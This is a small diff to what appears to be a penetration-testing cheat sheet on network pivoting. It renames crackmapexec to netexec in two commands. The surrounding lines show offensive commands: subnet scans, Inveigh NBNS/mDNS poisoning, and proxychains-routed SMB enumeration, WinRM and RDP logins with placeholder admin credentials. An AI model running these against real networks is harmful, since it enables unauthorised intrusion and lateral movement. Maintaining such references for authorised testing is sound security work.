@@ -107,7 +107,7 @@ ssh user@10.0.0.1
 
 # Access internal network directly from attacker as if local
 nmap -sT 10.10.10.0/24
-crackmapexec smb 10.10.10.0/24
+netexec smb 10.10.10.0/24
 ```
 
 ---
@@ -251,7 +251,7 @@ Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y
 
 # Use proxychains with tools
 proxychains nmap -sT -Pn 10.10.10.0/24 -p 445,3389,22
-proxychains crackmapexec smb 10.10.10.0/24
+proxychains netexec smb 10.10.10.0/24
 proxychains evil-winrm -i 10.10.10.5 -u admin -p password
 proxychains xfreerdp /v:10.10.10.5 /u:admin /p:password
 
